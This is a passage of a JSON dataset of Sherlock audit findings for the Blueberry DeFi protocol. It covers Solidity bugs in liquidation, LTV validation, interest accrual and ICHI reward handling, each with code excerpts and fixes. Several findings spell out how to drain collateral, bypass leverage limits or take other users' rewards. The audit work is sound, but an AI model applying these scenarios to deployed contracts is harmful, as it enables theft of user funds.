      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/126 \n\n## Found by \nobront\n\n## Summary\n\nWhen the value of the underlying asset is calculated in `getPositionRisk()`, it uses the `underlyingAmount`, which is the amount of tokens initially deposited, without any adjustment for the interest earned. This can result in users being liquidated early, because the system undervalues their assets.\n\n## Vulnerability Detail\n\nA position is considered liquidatable if it meets the following criteria: \n\n```solidity\n((borrowsValue - collateralValue) / underlyingValue) >= underlyingLiqThreshold\n```\nThe value of the underlying tokens is a major factor in this calculation. However, the calculation of the underlying value is performed with the following function call:\n```solidity\nuint256 cv = oracle.getUnderlyingValue(\n    pos.underlyingToken,\n    pos.underlyingAmount\n);\n```\nIf we trace it back, we can see that `pos.underlyingAmount` is set when `lend()` is called (ie when underlying assets are deposited). This is the only place in the code where this value is moved upward, and it is only increased by the amount deposited. It is never moved up to account for the interest payments made on the deposit, which can materially change the value.\n\n## Impact\n\nUsers can be liquidated prematurely because the value of their underlying assets are calculated incorrectly.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L485-L488\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/CoreOracle.sol#L182-L189\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L644\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nValue of the underlying assets should be derived from the vault shares and value, rather than being stored directly.",
      "summary": "\nThis bug report is about an issue in the code of the BlueBerryBank smart contract. The issue is that when the value of the underlying asset is calculated in `getPositionRisk()`, it uses the `underlyingAmount`, which is the amount of tokens initially deposited, without any adjustment for the interest earned. This can result in users being liquidated early, because the system undervalues their assets.\n\nThe code snippet provided shows that when `lend()` is called (ie when underlying assets are deposited), the `pos.underlyingAmount` value is only increased by the amount deposited. It is never moved up to account for the interest payments made on the deposit, which can materially change the value.\n\nThe impact of this bug is that users can be liquidated prematurely because the value of their underlying assets are calculated incorrectly.\n\nThe tool used to identify this issue is Manual Review. The recommendation is that the value of the underlying assets should be derived from the vault shares and value, rather than being stored directly.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/126",
      "tags": [
        "Liquidation",
        "Business Logic"
      ],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "6643",
      "title": "H-6: Liquidator can take all collateral and underlying tokens for a fraction of the correct price",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/127 \n\n## Found by \ncducrest-brainbot, rvierdiiev, obront, evan, berndartmueller, 0x52, XKET\n\n## Summary\n\nWhen performing liquidation calculations, we use the proportion of the individual token's debt they pay off to calculate the proportion of the liquidated user's collateral and underlying tokens to send to them. In the event that the user has multiple types of debt, the liquidator will be dramatically overpaid.\n\n## Vulnerability Detail\n\nWhen a position's risk rating falls below the underlying token's liquidation threshold, the position becomes liquidatable. At this point, anyone can call `liquidate()` and pay back a share of their debt, and receive a propotionate share of their underlying assets.\n\nThis is calculated as follows:\n```solidity\nuint256 oldShare = pos.debtShareOf[debtToken];\n(uint256 amountPaid, uint256 share) = repayInternal(\n    positionId,\n    debtToken,\n    amountCall\n);\n\nuint256 liqSize = (pos.collateralSize * share) / oldShare;\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n\npos.collateralSize -= liqSize;\npos.underlyingAmount -= uTokenSize;\npos.underlyingVaultShare -= uVaultShare;\n\n// ...transfer liqSize wrapped LP Tokens and uVaultShare underlying vault shares to the liquidator\n}\n```\nTo summarize:\n- The liquidator inputs a debtToken to pay off and an amount to pay\n- We check the amount of debt shares the position has on that debtToken\n- We call `repayInternal()`, which pays off the position and returns the amount paid and number of shares paid off\n- We then calculate the proportion of collateral and underlying tokens to give the liquidator\n- We adjust the liquidated position's balances, and send the funds to the liquidator\n\nThe problem comes in the calculations. The amount paid to the liquidator is calculated as:\n```solidity\nuint256 liqSize = (pos.collateralSize * share) / oldShare\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n```\nThese calculations are taking the total size of the collateral or underlying token. They are then multiplying it by `share / oldShare`. But `share / oldShare` is just the proportion of that one type of debt that was paid off, not of the user's entire debt pool.\n\nLet's walk through a specific scenario of how this might be exploited:\n- User deposits 1mm DAI (underlying) and uses it to borrow $950k of ETH and $50k worth of ICHI (11.8k ICHI)\n- Both assets are deposited into the ETH-ICHI pool, yielding the same collateral token\n- Both prices crash down by 25% so the position is now liquidatable (worth $750k)\n- A liquidator pays back the full ICHI position, and the calculations above yield `pos.collateralSize * 11.8k / 11.8k` (same calculation for the other two formulas)\n- The result is that for 11.8k ICHI (worth $37.5k after the price crash), the liquidator got all the DAI (value $1mm) and LP tokens (value $750k) \n\n## Impact\n\nIf a position with multiple borrows goes into liquidation, the liquidator can pay off the smallest token (guaranteed to be less than half the total value) to take the full position, stealing funds from innocent users.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L511-L572\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L760-L787\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdjust these calculations to use `amountPaid / getDebtValue(positionId)`, which is accurately calculate the proportion of the total debt paid off.",
      "summary": "\nThis bug report is about an issue found in the code of the BlueBerryBank smart contract. The issue is that when performing liquidation calculations, the liquidator can take all of the collateral and underlying tokens for a fraction of the correct price. This is because the calculation is taking the total size of the collateral or underlying token and multiplying it by a proportion of one type of debt that was paid off, not of the user's entire debt pool. \n\nThis can be exploited if a position with multiple borrows goes into liquidation. The liquidator can pay off the smallest token (guaranteed to be less than half the total value) to take the full position, stealing funds from innocent users. \n\nThe bug was found by cducrest-brainbot, rvierdiiev, obront, evan, berndartmueller, 0x52, XKET and the code snippet can be found at the two links provided. The tool used was manual review. \n\nThe recommendation to fix this issue is to adjust the calculations to use `amountPaid / getDebtValue(positionId)`, which is accurately calculate the proportion of the total debt paid off.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/127",
      "tags": [],
      "finders": [
        "0x52",
        "XKET",
        "cducrest-brainbot",
        "berndartmueller",
        "evan",
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "6642",
      "title": "H-5: Users can get around MaxLTV because of lack of strategyId validation",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/129 \n\n## Found by \n8olidity, carrot, Jeiwan, obront, Ch\\_301, cergyk, rbserver\n\n## Summary\n\nWhen a user withdraws some of their underlying token, there is a check to ensure they still meet the Max LTV requirements. However, they are able to arbitrarily enter any `strategyId` that they would like for this check, which could allow them to exceed the LTV for their real strategy while passing the approval.\n\n## Vulnerability Detail\n\nWhen a user calls `IchiVaultSpell.sol#reducePosition()`, it removes some of their underlying token from the vault, increasing the LTV of any loans they have taken.\n\nAs a result, the `_validateMaxLTV(strategyId)` function is called to ensure they remain compliant with their strategy's specified LTV:\n```solidity\nfunction _validateMaxLTV(uint256 strategyId) internal view {\n    uint256 debtValue = bank.getDebtValue(bank.POSITION_ID());\n    (, address collToken, uint256 collAmount, , , , , ) = bank\n        .getCurrentPositionInfo();\n    uint256 collPrice = bank.oracle().getPrice(collToken);\n    uint256 collValue = (collPrice * collAmount) /\n        10**IERC20Metadata(collToken).decimals();\n\n    if (\n        debtValue >\n        (collValue * maxLTV[strategyId][collToken]) / DENOMINATOR\n    ) revert EXCEED_MAX_LTV();\n}\n```\nTo summarize, this check:\n- Pulls the position's total debt value\n- Pulls the position's total value of underlying tokens\n- Pulls the specified maxLTV for this strategyId and underlying token combination\n- Ensures that `underlyingTokenValue * maxLTV > debtValue`\n\nBut there is no check to ensure that this `strategyId` value corresponds to the strategy the user is actually invested in, as we can see the `reducePosition()` function:\n```solidity\nfunction reducePosition(\n    uint256 strategyId,\n    address collToken,\n    uint256 collAmount\n) external {\n    doWithdraw(collToken, collAmount);\n    doRefund(collToken);\n    _validateMaxLTV(strategyId);\n}\n```\nHere is a quick proof of concept to explain the risk:\n- Let's say a user deposits 1000 DAI as their underlying collateral.\n- They are using a risky strategy (let's call it strategy 911) which requires a maxLTV of 2X (ie `maxLTV[911][DAI] = 2e5`)\n- There is another safer strategy (let's call it strategy 411) which has a maxLTV of 5X (ie `maxLTV[411][DAI] = 4e5`)\n- The user takes the max loan from the risky strategy, borrowing $2000 USD of value. \n- They are not allowed to take any more loans from that strategy, or remove any of their collateral.\n- Then, they call `reducePosition()`, withdrawing 1600 DAI and entering `411` as the strategyId. \n- The `_validateMaxLTV` check will happen on `strategyId = 411`, and will pass, but the result will be that the user now has only 400 DAI of underlying collateral protecting $2000 USD worth of the risky strategy, violating the LTV.\n\n## Impact\n\nUsers can get around the specific LTVs and create significantly higher leverage bets than the protocol has allowed. This could cause the protocol to get underwater, as the high leverage combined with risky assets could lead to dramatic price swings without adequate time for the liquidation mechanism to successfully protect solvency.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L266-L274\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L101-L113\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nSince the collateral a position holds will always be the vault token of the strategy they have used, you can validate the `strategyId` against the user's collateral, as follows:\n\n```solidity\naddress positionCollToken = bank.positions(bank.POSITION_ID()).collToken;\naddress positionCollId = bank.positions(bank.POSITION_ID()).collId;\naddress unwrappedCollToken = IERC20Wrapper(positionCollToken).getUnderlyingToken(positionCollId);\nrequire(strategies[strategyId].vault == unwrappedCollToken, \"wrong strategy\");\n```",
      "summary": "\nThis bug report is about an issue in the IchiVaultSpell.sol contract, which is part of the Sherlock Audit 2023-02-blueberry-judging project. The issue is that users are able to exceed their maximum Loan-to-Value (LTV) ratio by entering an arbitrary strategyId when calling the `reducePosition()` function. This means that users can take out loans with higher leverage than the protocol allows. \n\nThe `reducePosition()` function removes some of the user's underlying token from the vault, increasing the LTV of any loans they have taken. The `_validateMaxLTV(strategyId)` function is called to ensure they remain compliant with their strategy's specified LTV. This function pulls the position's total debt value, the position's total value of underlying tokens, and the specified maxLTV for the strategyId and underlying token combination, and ensures that `underlyingTokenValue * maxLTV > debtValue`. \n\nHowever, there is no check to ensure that the strategyId value corresponds to the strategy the user is actually invested in. This means that users can enter any strategyId they want, and if the maxLTV for that strategy is higher than their current LTV, the check will pass and they will be able to exceed the LTV for their real strategy.\n\nThe impact of this vulnerability is that users can get around the specific LTVs and create significantly higher leverage bets than the protocol has allowed. This could cause the protocol to get underwater, as the high leverage combined with risky assets could lead to dramatic price swings without adequate time for the liquidation mechanism to successfully protect solvency.\n\nThe recommendation is to validate the strategyId against the user's collateral, by requiring that `strategies[strategyId].vault == unwrappedCollToken`. This would ensure that users cannot enter a strategyId that does not correspond to their current strategy.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/129",
      "tags": [
        "Missing-Logic",
        "Data Validation"
      ],
      "finders": [
        "cergyk",
        "8olidity",
        "Ch\\_301",
        "rbserver",
        "Jeiwan",
        "obront",
        "carrot"
      ]
    },
    {
      "id": "6641",
      "title": "H-4: Fail to accrue interests on multiple token positions",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/140 \n\n## Found by \ncducrest-brainbot, rvierdiiev, Jeiwan\n\n## Summary\n\nIn `BlueBerryBank.sol` the functions `borrow`, `repay`, `lend`, or `withdrawLend` call `poke(token)` to trigger interest accrual on concerned token, but fail to do so for other token debts of the concerned position.  This could lead to wrong calculation of position's debt and whether the position is liquidatable.\n\n## Vulnerability Detail\n\nWhether a position is liquidatable or not is checked at the end of the `execute` function, the execution should revert if the position is liquidatable. \n\nThe calculation of whether a position is liquidatable takes into account all the different debt tokens within the position. However, the debt accrual has been triggered only for one of these tokens, the one concerned by the executed action. For other tokens, the value of `bank.totalDebt` will be lower than what it should be. This results in the debt value of the position being lower than what it should be and a position seen as not liquidatable while it should be liquidatable. \n\n## Impact\n\nUsers may be able to operate on their position leading them in a virtually liquidatable state while not reverting as interests were not applied. This will worsen the debt situation of the bank and lead to overall more liquidatable positions.\n\n## Code Snippet\n\nexecute checking isLiquidatable without triggering interests:\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L607\n\nactions only poke one token (here for borrow): \n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L709-L715\n\nbank.totalDebt is used to calculate a position's debt while looping over every tokens: \n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L451-L475\n\nThe position's debt is used to calculate the risk:\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L477-L495\n\nThe risk is used to calculate whether a debt is liquidatable:\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L497-L505\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nReview how token interests are triggered. Probably need to accrue interests on every debt token of a position at the beginning of execute.",
      "summary": "\nThis bug report is about an issue in the BlueBerryBank.sol smart contract. The functions `borrow`, `repay`, `lend`, or `withdrawLend` call `poke(token)` to trigger interest accrual on the concerned token, but fail to do so for other token debts of the concerned position. This could lead to wrong calculation of position's debt and whether the position is liquidatable. \n\nThe calculation of whether a position is liquidatable takes into account all the different debt tokens within the position, but the debt accrual has been triggered only for one of these tokens. This results in the debt value of the position being lower than what it should be and a position seen as not liquidatable while it should be liquidatable. \n\nThe impact of this bug is that users may be able to operate on their position leading them in a virtually liquidatable state while not reverting as interests were not applied. This will worsen the debt situation of the bank and lead to overall more liquidatable positions.\n\nThe bug was found by cducrest-brainbot, rvierdiiev, and Jeiwan, and was identified using manual review. The recommendation is to review how token interests are triggered and to accrue interests on every debt token of a position at the beginning of execute.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/140",
      "tags": [
        "Missing-Logic",
        "Deposit/Reward tokens"
      ],
      "finders": [
        "Jeiwan",
        "cducrest-brainbot",
        "rvierdiiev"
      ]
    },
    {
      "id": "6640",
      "title": "H-3: LP tokens are not sent back to withdrawing user",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/151 \n\n## Found by \nrvierdiiev, minhtrng, Dug, Jeiwan, obront, chaduke, koxuan, sinarette, Ch\\_301, cergyk, evan, berndartmueller, 0x52, Bauer\n\n## Summary\n\nWhen users withdraw their assets from `IchiVaultSpell.sol`, the function unwinds their position and sends them back their assets, but it never sends them back the amount they requested to withdraw, leaving the tokens stuck in the Spell contract.\n\n## Vulnerability Detail\n\nWhen a user withdraws from `IchiVaultSpell.sol`, they either call `closePosition()` or `closePositionFarm()`, both of which make an internal call to `withdrawInternal()`.\n\nThe following arguments are passed to the function:\n- strategyId: an index into the `strategies` array, which specifies the Ichi vault in question\n- collToken: the underlying token, which is withdrawn from Compound\n- amountShareWithdraw: the number of underlying tokens to withdraw from Compound\n- borrowToken: the token that was borrowed from Compound to create the position, one of the underlying tokens of the vault\n- amountRepay: the amount of the borrow token to repay to Compound\n- amountLpWithdraw: the amount of the LP token to withdraw, rather than trade back into borrow tokens\n\nIn order to accomplish these goals, the contract does the following...\n\n1) Removes the LP tokens from the ERC1155 holding them for collateral.\n```solidity\ndoTakeCollateral(strategies[strategyId].vault, lpTakeAmt);\n```\n2) Calculates the number of LP tokens to withdraw from the vault.\n```solidity\nuint256 amtLPToRemove = vault.balanceOf(address(this)) - amountLpWithdraw;\nvault.withdraw(amtLPToRemove, address(this));\n```\n\n3) Converts the non-borrowed token that was withdrawn in the borrowed token (not copying the code in, as it's not relevant to this issue).\n\n4) Withdraw the underlying token from Compound.\n```solidity\ndoWithdraw(collToken, amountShareWithdraw);\n```\n\n5) Pay back the borrowed token to Compound.\n```solidity\ndoRepay(borrowToken, amountRepay);\n```\n\n6) Validate that this situation does not put us above the maxLTV for our loans.\n```solidity\n_validateMaxLTV(strategyId);\n```\n\n7) Sends the remaining borrow token that weren't paid back and withdrawn underlying tokens to the user.\n```solidity\ndoRefund(borrowToken);\ndoRefund(collToken);\n```\n\nCrucially, the step of sending the remaining LP tokens to the user is skipped, even though the function specifically does the calculations to ensure that `amountLpWithdraw` is held back from being taken out of the vault.\n\n## Impact\n\nUsers who close their positions and choose to keep LP tokens (rather than unwinding the position for the constituent tokens) will have their LP tokens stuck permanently in the IchiVaultSpell contract.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L276-L330\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd an additional line to the `withdrawInternal()` function to refund all LP tokens as well:\n\n```diff\n  doRefund(borrowToken);\n  doRefund(collToken);\n+ doRefund(address(vault));\n```\n\n## Discussion\n\n**Gornutz**\n\nduplicate of 34",
      "summary": "\nThis bug report is about an issue where LP tokens are not sent back to withdrawing users when assets are withdrawn from the `IchiVaultSpell.sol` function. This issue was found by a group of people and the vulnerability detail was found by manually reviewing the code. The impact of the issue is that users who close their positions and choose to keep LP tokens will have their LP tokens stuck permanently in the IchiVaultSpell contract.\n\nThe code snippet that is relevant to this issue is located at https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L276-L330. The recommendation to resolve this issue is to add an additional line to the `withdrawInternal()` function to refund all LP tokens as well.\n\nThe discussion section mentions that this issue is a duplicate of issue 34. This means that the same issue has been reported before and the same solution can be used.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/151",
      "tags": [
        "Missing-Logic",
        "Deposit/Reward tokens"
      ],
      "finders": [
        "cergyk",
        "Bauer",
        "0x52",
        "Ch\\_301",
        "sinarette",
        "Jeiwan",
        "Dug",
        "koxuan",
        "berndartmueller",
        "evan",
        "chaduke",
        "rvierdiiev",
        "obront",
        "minhtrng"
      ]
    },
    {
      "id": "6639",
      "title": "H-2: Users who deposit extra funds into their Ichi farming positions will lose all their ICHI rewards",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/158 \n\n## Found by \ncarrot, rvierdiiev, minhtrng, obront, sinarette, tives, berndartmueller, 0x52\n\n## Summary\n\nWhen a user deposits extra funds into their Ichi farming position using `openPositionFarm()`, the old farming position will be closed down and a new one will be opened. Part of this process is that their ICHI rewards will be sent to the `IchiVaultSpell.sol` contract, but they will not be distributed. They will sit in the contract until the next user (or MEV bot) calls `closePositionFarm()`, at which point they will be stolen by that user.\n\n## Vulnerability Detail\n\nWhen Ichi farming positions are opened via the `IchiVaultSpell.sol` contract, `openPositionFarm()` is called. It goes through the usual deposit function, but rather than staking the LP tokens directly, it calls `wIchiFarm.mint()`. This function deposits the token into the `ichiFarm`, encodes the deposit as an ERC1155, and sends that token back to the Spell:\n```solidity\nfunction mint(uint256 pid, uint256 amount)\n    external\n    nonReentrant\n    returns (uint256)\n{\n    address lpToken = ichiFarm.lpToken(pid);\n    IERC20Upgradeable(lpToken).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amount\n    );\n    if (\n        IERC20Upgradeable(lpToken).allowance(\n            address(this),\n            address(ichiFarm)\n        ) != type(uint256).max\n    ) {\n        // We only need to do this once per pool, as LP token's allowance won't decrease if it's -1.\n        IERC20Upgradeable(lpToken).safeApprove(\n            address(ichiFarm),\n            type(uint256).max\n        );\n    }\n    ichiFarm.deposit(pid, amount, address(this));\n    // @ok if accIchiPerShare is always changing, so how does this work?\n    // it's basically just saving the accIchiPerShare at staking time, so when you unstake, it can calculate the difference\n    // really fucking smart actually\n    (uint256 ichiPerShare, , ) = ichiFarm.poolInfo(pid);\n    uint256 id = encodeId(pid, ichiPerShare);\n    _mint(msg.sender, id, amount, \"\");\n    return id;\n}\n```\nThe resulting ERC1155 is posted as collateral in the Blueberry Bank.\n\nIf the user decides to add more funds to this position, they simply call `openPositionFarm()` again. The function has logic to check if there is already existing collateral of this LP token in the Blueberry Bank. If there is, it removes the collateral and calls `wIchiFarm.burn()` (which harvests the Ichi rewards and withdraws the LP tokens) before repeating the deposit process.\n```solidity\nfunction burn(uint256 id, uint256 amount)\n    external\n    nonReentrant\n    returns (uint256)\n{\n    if (amount == type(uint256).max) {\n        amount = balanceOf(msg.sender, id);\n    }\n    (uint256 pid, uint256 stIchiPerShare) = decodeId(id);\n    _burn(msg.sender, id, amount);\n\n    uint256 ichiRewards = ichiFarm.pendingIchi(pid, address(this));\n    ichiFarm.harvest(pid, address(this));\n    ichiFarm.withdraw(pid, amount, address(this));\n\n    // Convert Legacy ICHI to ICHI v2\n    if (ichiRewards > 0) {\n        ICHIv1.safeApprove(address(ICHI), ichiRewards);\n        ICHI.convertToV2(ichiRewards);\n    }\n\n    // Transfer LP Tokens\n    address lpToken = ichiFarm.lpToken(pid);\n    IERC20Upgradeable(lpToken).safeTransfer(msg.sender, amount);\n\n    // Transfer Reward Tokens\n    (uint256 enIchiPerShare, , ) = ichiFarm.poolInfo(pid);\n    uint256 stIchi = (stIchiPerShare * amount).divCeil(1e18);\n    uint256 enIchi = (enIchiPerShare * amount) / 1e18;\n\n    if (enIchi > stIchi) {\n        ICHI.safeTransfer(msg.sender, enIchi - stIchi);\n    }\n    return pid;\n}\n```\nHowever, this deposit process has no logic for distributing the ICHI rewards. Therefore, these rewards will remain sitting in the `IchiVaultSpell.sol` contract and will not reach the user.\n\nFor an example of how this is handled properly, we can look at the opposite function, `closePositionFarm()`. In this case, the same `wIchiFarm.burn()` function is called. But in this case, it's followed up with an explicit call to withdraw the ICHI from the contract to the user.\n```solidity\ndoRefund(ICHI);\n```\nThis `doRefund()` function refunds the contract's full balance of ICHI to the `msg.sender`, so the result is that the next user to call `closePositionFarm()` will steal the ICHI tokens from the original user who added to their farming position.\n\n## Impact\n\nUsers who farm their Ichi LP tokens for ICHI rewards can permanently lose their rewards.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L199-L249\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/wrapper/WIchiFarm.sol#L116-L150\n\nHere is a link to the `harvest()` function  on the IchiFarmV2.sol contract, which is called by `wIchiFarm.sol` and contains the logic for distributing ICHI rewards: https://github.com/ichifarm/ichi-farming/blob/206c44b790fbb2a1e3a655685eb3ab8d793c9f00/contracts/ichiFarmV2.sol#L238-L257\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIn the `openPositionFarm()` function, in the section that deals with withdrawing existing collateral, add a line that claims the ICHI rewards for the calling user.\n\n```diff\nif (collSize > 0) {\n    (uint256 decodedPid, ) = wIchiFarm.decodeId(collId);\n    if (farmingPid != decodedPid) revert INCORRECT_PID(farmingPid);\n    if (posCollToken != address(wIchiFarm))\n        revert INCORRECT_COLTOKEN(posCollToken);\n    bank.takeCollateral(collSize);\n    wIchiFarm.burn(collId, collSize);\n+   doRefund(ICHI);\n}\n```",
      "summary": "\nThis bug report details an issue with the Ichi farming positions in the IchiVaultSpell.sol contract. When a user deposits extra funds into their Ichi farming position using `openPositionFarm()`, the old farming position will be closed down and a new one will be opened. Part of this process is that their ICHI rewards will be sent to the `IchiVaultSpell.sol` contract, but they will not be distributed. They will sit in the contract until the next user (or MEV bot) calls `closePositionFarm()`, at which point they will be stolen by that user.\n\nThis means that users who farm their Ichi LP tokens for ICHI rewards can permanently lose their rewards. The bug was found by carrot, rvierdiiev, minhtrng, obront, sinarette, tives, berndartmueller, and 0x52. It was found through manual review.\n\nThe recommendation is to add a line to the `openPositionFarm()` function that claims the ICHI rewards for the calling user. This would ensure that users get the rewards they are expecting.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/158",
      "tags": [
        "Deposit/Reward tokens",
        "Configuration",
        "Missing-Logic"
      ],
      "finders": [
        "sinarette",
        "0x52",
        "berndartmueller",
        "tives",
        "rvierdiiev",
        "obront",
        "minhtrng",
        "carrot"
      ]
    },
    {
      "id": "6638",
      "title": "H-1: Too few `ICHI` v2 farming reward tokens transferred to the user due to incorrect decimal precision",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/319 \n\n## Found by \nberndartmueller, 0x52\n\n## Summary\n\nThe `burn` function in the `WIchiFarm` contract transfers too few `ICHI` **v2** farming reward tokens to the caller due to using 9 decimals instead of 18 decimals for the `ICHI` **v2** token.\n\n## Vulnerability Detail\n\nClosing an ICHI vault spell farming position burns the wrapped ICHI vault LP tokens (`WIchiFarm` ERC-1155 tokens). Farming rewards are harvested from the ICHI farm ([see contract on Etherscan](https://etherscan.io/address/0x275dfe03bc036257cd0a713ee819dbd4529739c8)) and received as `ICHI` **v1** tokens.\n\nThe `ICHI` **v1** ERC-20 token uses **9 decimals** ([see token on Etherscan](https://etherscan.io/token/0x903bEF1736CDdf2A537176cf3C64579C3867A881)), whereas the `ICHI` **v2** ERC-20 token uses **18 decimals** ([see token on Etherscan](https://etherscan.io/token/0x111111517e4929D3dcbdfa7CCe55d30d4B6BC4d6)).\n\nThose received `ICHI` **v1** tokens are then converted to **v2** tokens in line 134.\n\nTo calculate the user's share of eligible `ICHI` **v2** reward tokens, the reward per share accumulator `stIchiPerShare` at the time of minting the `WIchiFarm` token and the current `enIchiPerShare` accumulator is used.\n\nHowever, those accumulator values are in **9 decimals** precision (please see the `ichiFarmV2.harvest` function for proof that `pool.accIchiPerShare` uses 9 decimals, otherwise the `ICHI` token transfer would fail due to inflated `_pendingIchi`). Given that `amount` is in **18 decimals**, the calculation of `stIchi` and `enIchi` in lines 143 and 144 will result in a value with **9 decimals** precision.\n\nAs previously mentioned, the `ICHI` **v2** token uses **18 decimals**. Therefore, too few `ICHI` **v2** tokens are transferred.\n\n## Impact\n\nUsers will receive substantially fewer `ICHI` v2 farming reward tokens than expected.\n\n## Code Snippet\n\n[wrapper/WIchiFarm.sol#L143-L144](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/wrapper/WIchiFarm.sol#L143-L144)\n\n```solidity\n116: function burn(uint256 id, uint256 amount)\n117:     external\n118:     nonReentrant\n119:     returns (uint256)\n120: {\n121:     if (amount == type(uint256).max) {\n122:         amount = balanceOf(msg.sender, id);\n123:     }\n124:     (uint256 pid, uint256 stIchiPerShare) = decodeId(id);\n125:     _burn(msg.sender, id, amount);\n126:\n127:     uint256 ichiRewards = ichiFarm.pendingIchi(pid, address(this));\n128:     ichiFarm.harvest(pid, address(this));\n129:     ichiFarm.withdraw(pid, amount, address(this));\n130:\n131:     // Convert Legacy ICHI to ICHI v2\n132:     if (ichiRewards > 0) {\n133:         ICHIv1.safeApprove(address(ICHI), ichiRewards);\n134:         ICHI.convertToV2(ichiRewards);\n135:     }\n136:\n137:     // Transfer LP Tokens\n138:     address lpToken = ichiFarm.lpToken(pid);\n139:     IERC20Upgradeable(lpToken).safeTransfer(msg.sender, amount);\n140:\n141:     // Transfer Reward Tokens\n142:     (uint256 enIchiPerShare, , ) = ichiFarm.poolInfo(pid);\n143:     uint256 stIchi = (stIchiPerShare * amount).divCeil(1e18);\n144:     uint256 enIchi = (enIchiPerShare * amount) / 1e18; // @audit-info `enIchi` and `stIchi` are in 9 decimal precision\n145:\n146:     if (enIchi > stIchi) {\n147:         ICHI.safeTransfer(msg.sender, enIchi - stIchi);\n148:     }\n149:     return pid;\n150: }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider changing the denominator in lines 143 and 144 from `1e18` to `1e9` to use the required `18` decimals for the `ICHI` v2 token.",
      "summary": "\nThis bug report is regarding the `burn` function in the `WIchiFarm` contract, which transfers too few `ICHI` **v2** farming reward tokens to the caller due to using 9 decimals instead of 18 decimals for the `ICHI` **v2** token. The `burn` function is used when closing an ICHI vault spell farming position and burning the wrapped ICHI vault LP tokens (`WIchiFarm` ERC-1155 tokens). Farming rewards are harvested from the ICHI farm and received as `ICHI` **v1** tokens. \n\nThe `ICHI` **v1** ERC-20 token uses **9 decimals**, whereas the `ICHI` **v2** ERC-20 token uses **18 decimals**. Those received `ICHI` **v1** tokens are then converted to **v2** tokens in line 134. To calculate the user's share of eligible `ICHI` **v2** reward tokens, the reward per share accumulator `stIchiPerShare` at the time of minting the `WIchiFarm` token and the current `enIchiPerShare` accumulator is used.\n\nHowever, those accumulator values are in **9 decimals** precision and the `amount` is in **18 decimals**. This results in too few `ICHI` **v2** tokens being transferred. This means that users will receive substantially fewer `ICHI` v2 farming reward tokens than expected.\n\nThe recommendation is to change the 